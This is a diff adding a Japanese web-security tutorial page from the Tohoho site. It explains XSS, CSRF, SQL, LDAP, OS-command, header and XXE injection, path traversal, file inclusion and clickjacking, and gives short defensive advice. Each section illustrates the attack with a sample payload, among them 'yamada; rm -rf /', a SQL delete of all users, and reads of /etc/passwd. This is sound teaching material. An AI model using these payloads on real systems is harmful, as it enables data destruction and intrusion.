@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset=utf-8"utf-8">
+<title>セキュリティ - とほほのWWW入門</title>
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<link rel="stylesheet" href="../style3.css" tppabs="http://www.tohoho-web.com/style3.css">
+</head>
+<body>
+
+<h2>セキュリティ</h2>
+<a href="../www.htm" tppabs="http://www.tohoho-web.com/www.htm">トップ</a> &gt;
+セキュリティ
+
+<h4 id="index">目次</h4>
+<div class=i>
+<ul>
+<li><a href="#xss">クロスサイトスクリプティング(XSS)</a></li>
+<li><a href="#forgery">フォージェリ(偽装)</a>
+  <ul>
+  <li><a href="#csrf">クロスサイトリクエストフォージェリ(CSRF)</a></li>
+  <li><a href="#ssrf">サーバサイドリクエストフォージェリ(SSRF)</a></li>
+  </ul>
+<li><a href="#injection">インジェクション攻撃</a>
+  <ul>
+  <li><a href="#html-injection">HTMLインジェクション</a></li>
+  <li><a href="#sql-injection">SQLインジェクション</a></li>
+  <li><a href="#ldap-injection">LDAPインジェクション</a></li>
+  <li><a href="#os-command-injection">OSコマンドインジェクション</a></li>
+  <li><a href="#http-header-injection">HTTPヘッダインジェクション</a></li>
+  <li><a href="#mail-header-injection">メールヘッダインジェクション</a></li>
+  <li><a href="#script-injection">スクリプトインジェクション</a></li>
+  <li><a href="#xxe">XMLエクスターナルエンティティ(XXE)</a></li>
+  </ul>
+<li>ファイルアクセス系
+  <ul>
+  <li><a href="#directory-traversal">ディレクトリトラバーサル</a>
+  <li><a href="#null-byte-attack">Nullバイト攻撃</a>
+  <li><a href="#file-inclusion">ファイルインクルージョン</a>
+  </ul>
+<li>その他の攻撃
+  <ul>
+  <li><a href="#open-redirect">オープンリダイレクト</a>
+  <li><a href="#click-jacking">クリックジャッキング</a>
+  <li><a href="#brute-force-attack">ブルートフォースアタック</a>
+  <li><a href="#xst">クロスサイトトレーシング(XST)</a>
+  </ul>
+<!--
+<li>対策
+  <ul>
+  <li><a href="#sanitizing">サニタイジング</a>
+  <li><a href="#sop">同一オリジンポリシー(SOP)</a>
+  </ul>
+-->
+</ul>
+</div>
+
+<h4 id="xss">クロスサイトスクリプティング(XSS)</h4>
+<div class=i>
+<p>Cross Site Scripting。Web アプリケーションの脆弱性のひとつで、HTML を動的に生成する際、悪意のあるユーザから送られたデータをそのまま HTML として表示してしまい、悪意のあるスクリプトが実行されてしまうものです。一種の <a href="#html-injection">HTMLインジェクション</a> とも言えます。例えば、下記のようなテンプレートで $data に 「山田&lt;script&gt;悪意のあるスクリプト&lt;/script&gt;太郎」 というデータが送信された場合、悪意のあるスクリプトが実行されてしまいます。</p>
+<pre class=c>
+&lt;div&gt;<em>$data</em>&lt;/div&gt;
+　↓
+&lt;div&gt;<em>山田&lt;script&gt;悪意のあるスクリプト&lt;/script&gt;太郎</em>&lt;/div&gt;
+</pre>
+<p>詳細は 「<a href="xss.html" tppabs="http://www.tohoho-web.com/ex/xss.html">クロスサイトスクリプティング (XSS: Cross Site Scripting)</a>」を参照してください。</p>
+</div>
+
+<h4 id="forgery">フォージェリ(偽装)</h4>
+<div class=i>
+<p>フォージェリ(forgery)は「偽装」を意味します。悪意の無い利用者のフリをして(偽装)して、脆弱性のサイトに攻撃を仕掛けます。フォージェリ系の攻撃には下記などがあります。</p>
+<ul>
+<li><a href="#csrf">クロスサイトリクエストフォージェリ(CSRF)</a></li>
+<li><a href="#ssrf">サーバサイドリクエストフォージェリ(SSRF)</a></li>
+</ul>
+</div>
+
+<h4 id="csrf">クロスサイトリクエストフォージェリ(CSRF)</h4>
+<div class=i>
+<p>Cross Site Request Forgery。Web アプリケーションの脆弱性のひとつで、例えば、攻撃者が自分のサイトや各種掲示板に仕掛けた下記の様なリンクを利用者がクリックした場合、利用者のブラウザから脆弱性のあるサイトに悪意のあるリクエストが、利用者の名義で送信されてしまうものです。ID/パスワードで守られているページであっても、利用者がログインしている間はセッションが有効であり、書き込みが成功してしまいます。これにより掲示板に利用者の名義で悪意のある書き込みが行われたり、不正な送金が行われたりします。</p>
+<pre class=c>
+&lt;a href="http://脆弱性のあるサイト/post.cgi?msg=<em>悪意のある書き込み</em>"&gt;詳細はこちら&lt;/a&gt;
+</pre>
+<p>CSRFの対策としては、CSRFトークンを用いるのが一般的です。サーバ側でセッションIDやその他の値から CSRFトークンと呼ばれるトークンを生成し、フォームに hidden で埋め込みます。フォームのデータを受け取った際にこのトークンを検証することにより、情報が自ら生成したフォームに入力されたもの、つまり、悪意のあるフォームに入力されたものではないことを検証します。</p>
+<pre class="c">
+&lt;form method="POST" action="post.cgi"&gt;
+  &lt;input type="hidden" name="<em>csrf_token</em>" value="<em>550e8400e29b41d4a716446655440000</em>"&gt;
+  &lt;input type="text" name="msg"&gt;
+&lt;/form&gt;
+</pre>
+</div>
+
+<h4 id="ssrf">サーバサイドリクエストフォージェリ(SSRF)</h4>
+<div class=i>
+<p>Server Side Request Forgery。サーバ側のプログラム、ミドルウェア、ライブラリ、OS 等の脆弱性を攻撃することで、サーバ上で不正なコマンドを実行し、リモートシェル(rsh) などを用いてサーバからさらに、内部サーバや外部の第三者サーバに攻撃を仕掛けるものです。ブラウザ利用者の権限でサーバに攻撃を仕掛けるのが CRFS。サーバの権限でさらに他のサーバに攻撃を仕掛けるのが SSRF に分類されます。</p>
+</div>
+
+<h4 id="injection">インジェクション攻撃</h4>
+<div class=i>
+<p>Injection Attack または Code Injection とも呼ばれます。インジェクション(injection)は 「注入」 を意味します。HTML や SQL の中に悪意のあるデータを忍び込ませる(注入する)ことにより、悪意のあるスクリプトや命令を実行させる攻撃です。代表的にあものに下記などがあります。 </p>
+<ul>
+<li><a href="#html-injection">HTMLインジェクション</a></li>
+<li><a href="#sql-injection">SQLインジェクション</a></li>
+<li><a href="#ldap-injection">LDAPインジェクション</a></li>
+<li><a href="#os-command-injection">OSコマンドインジェクション</a></li>
+<li><a href="#http-header-injection">HTTPヘッダインジェクション</a></li>
+<li><a href="#mail-header-injection">メールヘッダインジェクション</a></li>
+<li><a href="#script-injection">スクリプトインジェクション</a></li>
+<li><a href="#xxe">XMLエクスターナルエンティティ(XXE)</a></li>
+</ul>
+</div>
+
+<h4 id="html-injection">HTMLインジェクション</h4>
+<div class=i>
+<p>HTML Injection。Web アプリケーションの脆弱性のひとつで、HTML を動的に生成する際に、ユーザから送り込まれたデータをそのまま HTML として表示してしまい、悪意のある書き込みや、悪意のあるスクリプトが実行されてしまうものです。HTML インジェクションの脆弱性を持ったサイトの多くは、<a href="#xss">クロスサイトスクリプティング</a> の標的とされます。</p>
+</div>
+
+<h4 id="sql-injection">SQLインジェクション</h4>
+<div class=i>
+<p>SQL Injection。Web アプリケーションの脆弱性のひとつで、サーバサイドで SQL 文を動的に生成する際に、ユーザから送り込まれたデータをそのまま SQL 文として実行してしまい、データ破壊、データ漏洩などの被害が生じるものです。例えば、下記の例で $data に 「Yamada'; delete from users where user_name like '%」 というデータが送り込まれた場合、すべてのユーザデータが消失してしまいます。</p>
+<pre class=c>
+select * from users where user_name = '<em>$data</em>';
+　↓
+select * from users where user_name = '<em>Yamada'; delete from users where user_name like '%</em>';
+</pre>
+</div>
+
+<h4 id="ldap-injection">LDAPインジェクション</h4>
+<div class=i>
+<p>サーバサイドで LDAP の構文を動的に生成する際に、ユーザから送り込まれたデータをそのまま利用してしまい、LDAP サーバへの不正アクセスを発生させるものです。例えば下記の例では、$user に 「tanaka)|(objectClass=*」、$passwd に 「dummy)」 を指定されることで、パスワードが誤っていてもログインできてしまいます。</p>
+<pre class=c>
+(&amp;(user=<em>$user</em>)(passwd=<em>$passwd</em>))
+　↓
+(&amp;(user=<em>tanaka)(|(objectClass=*</em>)(passwd=<em>dummy)</em>))
+</pre>
+</div>
+
+<h4 id="os-command-injection">OSコマンドインジェクション</h4>
+<div class=i>
+<p>Web アプリケーションの脆弱性のひとつで、サーバサイドで OS コマンドのコマンドラインを動的に生成する際に、ユーザから送り込まれたデータをそのままコマンドラインとして実行してしまい、ファイル破壊、ファイル改竄などの被害が生じるものです。例えば、下記の例で $data に 「yamada; rm -rf /」 というデータが送り込まれた場合、権限のあるすべてのファイルが削除されてしまいます。</p>
+<pre class=c>
+/opt/myapp/bin/add_user <em>$data</em>
+　↓
+/opt/myapp/bin/add_user <em>yamada; rm -rf /</em>
+</pre>
+</div>
+
+<h4 id="http-header-injection">HTTPヘッダインジェクション</h4>
+<div class=i>
+<p>Web アプリケーションの脆弱性のひとつで、HTTP ヘッダを動的に生成する際に、ユーザから送り込まれたデータをそのままヘッダに埋め込んでしまい、不正なヘッダや表示の埋め込み、<a href="#xss">XSS</a> と同様の悪意のスクリプトが実行されてしまうものです。例えば、下記の例で $data に 「1234&#9166;&#9166;&lt;script&gt;悪意のあるスクリプト&lt;/scirpt&gt;」が送り込まれた場合、空行は HTTP ヘッダの終わりとみなされるため、スクリプトは HTML として解釈されることとなり、XSS と同様の問題が発生します。この改行コードによる攻撃は <b>CRLFインジェクション</b> とも呼ばれます。</p>
+<pre class=c>
+Set-Cookie: data=<em>$data</em>
+ ↓
+Set-Cookie: data=<em>1234<span class="cm">&#9166;</span>
+<span class="cm">&#9166;</span>
+&lt;script&gt;悪意のあるスクリプト&lt;/script&gt;</em>
+</pre>
+</div>
+
+<h4 id="mail-header-injection">メールヘッダインジェクション</h4>
+<div class=i>
+<p>Webアプリケーションの脆弱性のひとつで、メールヘッダを動的に生成する際に、ユーザから送り込まれたデータをそのままメールヘッダに埋め込んでしまい、宛先の追加などのヘッダ改竄、メール本文改竄などが行われるものです。これも CRLFインジェクションのひとつです。例えば、下記の例で $data に 「foo@example.com&#9166;Bcc: 悪意のあるユーザのメールアドレス」 が送り込まれた場合、メールは、悪意のあるユーザにも Bcc で送信されることとなります。</p>
+<pre class=c>
+To: <em>$data</em>
+　↓
+To: <em>foo@example.com</em><span class="cm">&#9166;</span>
+<em>Bcc: 悪意のあるユーザのメールアドレス</em>
+</pre>
+</div>
+
+<h4 id="script-injection">スクリプトインジェクション</h4>
+<div class=i>
+<p>テンプレートエンジンを用いるなどして JavaScript 中にユーザから送り込まれたデータをそのまま参照してしまい、悪意のあるスクリプトが実行されてしまうものです。下記は JavaScript の例ですが、$data に 「'; 悪意のあるスクリプト; var dummy = '」 が送り込まれた場合、JavaScript 実行時に悪意のあるスクリプトが実行されてしまいます。</p>
+<pre class=c>
+&lt;script&gt;
+var data = '<em>$data</em>';
+&lt;/script&gt;
+　↓
+&lt;script&gt;
+var data = '<em>'; 悪意のあるスクリプト; var dummy = '</em>';
+&lt;/script&gt;
+</pre>
+</div>
+
+<h4 id="xxe">XMLエクスターナルエンティティ(XXE)</h4>
+<div class=i>
+<p>XML External Entiry。XML に対するインジェクション攻撃です。XML を解析する際に、&amp;参照名; に対する DTD を定義することで、システムファイルを参照できてしまうことを悪用するものです。下記の例では、$data の中に foo 要素および、その中で利用可能な &amp;baa; 実体参照の DTD 自体を送り込むことで、システムファイル /etc/password を読み出そうとしています。</p>
+<pre class=c>
+&lt;data&gt;<em>$data</em>&lt;/data&gt;
+　↓
+&lt;data&gt;
+<em>&lt;!DOCTYPE foo [
+  &lt;!ELEMENT foo ANY&gt;
+  &lt;!ENTITY baa SYSTEM "file:///etc/password"&gt;
+]&gt;
+&lt;foo&gt;&amp;baa;&lt;/foo&gt;</em>
+&lt;/data&gt;
+</pre>
+</div>
+
+<h4 id="directory-traversal">ディレクトリトラバーサル</h4>
+<div class=i>
+<p>traversal は 「縦走」と訳されます。サーバ側でパス名を動的に生成する際に、ユーザから送り込まれたデータを不用意に使用してしまうことにより、OS のシステムファイルに不正にアクセスされてしまうものです。例えば、下記の例で $data に 「../../../etc/passwd」 というデータが送り込まれた場合、/etc/passwd ファイルが読み取られてしまう危険性があります。対策としては、受け取ったデータに .. や / などの文字列が含まれていないことを確認する必要があります。</p>
+<pre class=c>
+$file = '/var/app/files/' + <em>$data</em>;
+　↓
+$file = '/var/app/files/' + <em>../../../etc/passwd</em>;
+</pre>
+</div>
+
+<h4 id="null-byte-attack">Nullバイト攻撃</h4>
+<div class=i>
+<p><a href="#directory-traversal">ディレクトリトラバーサル</a> に関連する攻撃のひとつで、文字列の中に %00, \0, \x00 などの Null文字 を含めることで、プログラムのチェックをすり抜けるものです。例えば、下記の例では、最後に拡張子 .jpg を付与しているため、$data に ../../../etc/passwd を指定されても、/etc/passwd.jpg となり、JPEG ファイル以外にはアクセスできないはずですが、PHP の一部の関数などでは Null文字を文字列の終端とみなしてしまうため、../../../etc/passwd\0 を指定すると、/etc/passwd ファイルにアクセスできてしまいます。</p>
+<pre class=c>
+$file = '/var/app/img/' + <em>$data</em> + '.jpg';
+　↓
+$file = '/var/app/img/' + <em>../../../etc/passwd\0</em> + '.jpg';
+</pre>
+</div>
+
+<h4 id="file-inclusion">ファイルインクルージョン</h4>
+<div class=i>
+<p><a href="#directory-traversal">ディレクトリトラバーサル</a> や <a href="#null-byte-attack">Nullバイト攻撃</a> によって不正なファイルを読み込まれてしまうものです。通常はサーバ上のローカルファイルを読み込まれるのでローカルファイルインクルージョン(LFI)と呼ばれますが、ファイル名に http://～ を指定すると、リモートファイルを読み込むシステムでは、リモートファイルインクルージョン(RFI) の問題も発生します。。</p>
+<pre class=c>
+include(<em>$data</em>);
+　↓
+include(<em>'http://悪意のあるサイト/悪意のあるファイル'</em>);
+</pre>
+</div>
+
+<h4 id="open-redirect">オープンリダイレクト</h4>
+<div class=i>
+<p>悪意を持ったユーザによりリダイレクト先の URL を改竄されるものです。下記の様に、POST や GET のパラメータとしてリダイレクト先の URL をブラウザから送信するケースで、悪意を持ったユーザが、hidden パラメータを改竄したフォームやリンクを利用者にクリックさせることで、利用者を悪意のあるサイトに誘導します。サーバー側で、リダイレクト先の URL のドメインが正しいかなどの妥当性をチェックする必要があります。</p>
+<pre class=c>
+&lt;form ...&gt;
+  &lt;input type="text" name="id"&gt;
+  &lt;input type="password" name="pw"&gt;
+  <em>&lt;input type="hidden" name="url" value="http://example.com/dashboard"&gt;</em>
+  &lt;input type="submit" value="Login"&gt;
+&lt;/form&gt;
+</pre>
+</div>
+
+<h4 id="click-jacking">クリックジャッキング</h4>
+<div class=i>
+<p>ジャック(jack)はハイジャック(hijack)と同様、「奪い取る」の意味があります。利用者が攻撃対象のサイトにログインした状態で、悪意のあるサイトのページを開いた際、悪意のあるページのボタンの上に、攻撃対象のページを透明な &lt;iframe&gt; で表示することにより、利用者が意図しないまま攻撃対象サイトの「いいね」ボタンや退会ボタンなどをクリックさせられてしまうものです。HTTP ヘッダに X-Frame-Options を指定することにより、&lt;frame&gt; や &lt;iframe&gt; での表示を制限する対策が有効です。</p>
+<pre class=c>
+&lt;button style="position:absolute; top:300px; left:300px;"&gt;Click&lt;/button&gt;
+&lt;iframe src="攻撃対象のページ"
+  style="position:absolute; top:0; left:0; width:100%; height:100%; <em>opacity:0.0</em>;"&gt;&lt;/iframe&gt;
+</pre>
+</div>
+
+<h4 id="brute-force-attack">ブルートフォースアタック</h4>
+<div class=i>
+<p>brute は 「けだもの」、brute force で「けだものの様に力づくで」 を意味します。日本語では 「総当たり攻撃」 とも訳されます。パスワードを、よく使われるパスワードの辞書やランダムな文字列を使用して総攻撃をかけるもので、p@ssw0rd などよく使われるパスワードの場合数秒で突破されてしまいます。パスワード誤りが何度が続くとアカウントをしばらくロックするなどの対策があります。</p>
+</div>
+
+<h4 id="xst">クロスサイトトレーシング(XST)</h4>
+<div class=i>
+<p><a href="#xss">XSS</a> 脆弱性のあるサイトに対してスクリプトを埋め込み、HTTP の TRACE メソッドを発行することで、リクエストに含まれる Authentication ヘッダの内容を読み取ってしまう攻撃です。TRACE メソッドでは、リクエストされた内容をそのままレスポンスとして返却するため、リクエストに含まれる Basic 認証の ID/パスワードなどを盗み出すことが可能となります。対策としてはサーバ側で TRACE を受け付けないように設定するなどがあります。</p>
+</div>
+
+<!--
+<h4 id="index">セキュリティ対策</h4>
+<div class=i>
+<p>セキュリティ対策としては下記などがあります。詳細は別途...</p>
+<ul>
+<li>Cookie の Secure 属性
+<li>X-Frame-Options
+<li>CAPTCHA
+<li>WAF (Web Application Firewall)
+<li>DMZ (DeMilitarized Zone)
+<li>IDS/IPS (Intrusion Prevention System/Intrusion Protect System)
+</ul>
+</div>
+
+<h4 id="sanitizing">サニタイジング</h4>
+<div class=i>
+<p>sanitize は 「無害化」 を意味します。<a href="#xss">XSS</a> や <a href="#sql-injection">SQLインジェクション</a> などのインジェクション攻撃に対して、HTML や SQL などの文法として意味のあるメタ文字をエスケープすることにより無害化します。対処となる言語によってエスケープの方法は異なります。例えば、HTML の場合は、&amp; &lt; &gt; ' " などの文字を &amp;amp;, &amp;lt;, &amp;gt;, &amp;quot;, &amp;#39; などに置換します。</p>
+</div>
+
+<h4 id="sop">同一オリジンポリシー(SOP)</h4>
+<div class=i>
+<p>オリジンは、スキーマ、サーバ名、ポート番号の組み合わせで構成されます。例えば下記の例では、(B) は (A) と同じオリジンとみなされますが、(C)～(E) はそれぞれスキーマ、サーバ名、ポート番号が異なるため、別のオリジンとみなされます。異なるオリジンをまたがるアクセスをクロスオリジンと呼びます。</p>
+<pre class=c>
+(A) http://www.example.com/aaa.html
+(B) http://www.example.com/bbb.html ... 同一オリジン
+(C) https://www.example.com/ ... スキーマが異なるので、クロスオリジン
+(D) http://www2.example.com/ ... サーバ名が異なるので、クロスオリジン
+(E) http://www.example.com:8080/ ... ポート番号が異なるので、クロスオリジン
+</pre>
+<p>同一オリジンポリシー(SOP: Same Origin Policy) とは、同一のオリジンに対しては許可する操作であっても、クロスオリジンの場合はアクセスを制限することにより、セキュリティを確保する仕組みです。Ajax(XMLHttpRequest)では、リクエストの発行は許可されますが、その応答を読み取ることが制限されます。また、JavaScript では window.opener.document など、いくつかのオブジェクトへのアクセスが制限されます。これらの他にも様々な制限がありますが、ブラウザによって実装が異なっています。</p>
+</div>
+
+<h4 id="csp">コンテンツセキュリティポリシー(CSP)</h4>
+<div class=i>
+<p>Content-Security-Policy ヘッダ。</p>
+</div>
+
+<h4 id="cors">クロスオリジンリソース共有(CORS)</h4>
+<div class=i>
+<pre class=c>
+GET /sample HTTP/1.1
+<em>Origin: http://sub.example.com/</em>
+</pre>
+<pre class=c>
+HTTP/1.1 200 OK
+<em>Access-Control-Allow-Headers: Content-Type</em>
+<em>Access-Control-Allow-Origin: http://sub.example.com/</em>
+</pre>
+</div>
+-->
+
+<hr>
+<div>Copyright (C) 2018 杜甫々</div>
+<div>初版:2018年2月25日 最終更新:2018年2月25日</div>
+<div>http://www.tohoho-web.com/ex/security.html</div>
+</body>
+</html>
